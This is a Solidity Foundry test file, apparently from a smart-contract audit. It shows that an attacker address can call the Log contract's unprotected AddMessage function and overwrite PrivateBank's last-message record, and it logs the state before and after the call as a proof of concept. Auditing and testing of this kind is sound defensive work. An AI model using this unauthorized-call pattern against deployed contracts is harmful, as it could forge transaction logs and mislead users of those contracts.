// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e.sol";

contract Audit_PrivateBankTest is Test {
    // Renamed to avoid conflict with StdAssertions.log event
    Log public logContract;
    PrivateBank public privateBank;
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        // Deploy Log contract directly
        logContract = new Log();
        
        // Deploy PrivateBank with Log address
        privateBank = new PrivateBank(address(logContract));
    }

    function test_unauthorizedAddMessage() public {
        console2.log("--- BEFORE-Trigger State ---");
        // Query initial state of LastMsg (tuple decomposition)
        (address senderBefore, string memory dataBefore, uint256 valBefore, uint256 timeBefore) = logContract.LastMsg();
        
        // Log initial state
        console2.log("Pre-trigger LastMsg Sender:", senderBefore);
        console2.log("Pre-trigger LastMsg Val:", valBefore);
        console2.log("Pre-trigger LastMsg Data:", dataBefore);
        console2.log("Pre-trigger LastMsg Time:", timeBefore);

        console2.log("--- Trigger: Attacker calls AddMessage ---");
        // Attacker calls AddMessage
        vm.prank(attacker);
        logContract.AddMessage(attacker, 1 ether, "Unauthorized access");

        console2.log("--- AFTER-Trigger State ---");
        // Query state after the call
        (address senderAfter, string memory dataAfter, uint256 valAfter, uint256 timeAfter) = logContract.LastMsg();
        
        // Log after state
        console2.log("Post-trigger LastMsg Sender:", senderAfter);
        console2.log("Post-trigger LastMsg Val:", valAfter);
        console2.log("Post-trigger LastMsg Data:", dataAfter);
        console2.log("Post-trigger LastMsg Time:", timeAfter);

        console2.log("--- State Comparison ---");
        // Check if state changed as expected
        bool senderChanged = (senderAfter == attacker);
        bool valueChanged = (valAfter == 1 ether);
        bool dataChanged = keccak256(abi.encodePacked(dataAfter)) == keccak256(abi.encodePacked("Unauthorized access"));
        bool timeChanged = (timeAfter > timeBefore); // Timestamp must advance

        console2.log("Sender changed to attacker? (expected true):", senderChanged);
        console2.log("Value changed to 1 ether? (expected true):", valueChanged);
        console2.log("Data set to 'Unauthorized access'? (expected true):", dataChanged);
        console2.log("Timestamp advanced? (expected true):", timeChanged);

        // Final vulnerability determination
        if (senderChanged && valueChanged && dataChanged && timeChanged) {
            console2.log("Vulnerability Exists: Unauthorized call successfully modified all message fields");
        } else {
            console2.log("Vulnerability not Exist: State changes do not match attack parameters");
        }
    }
}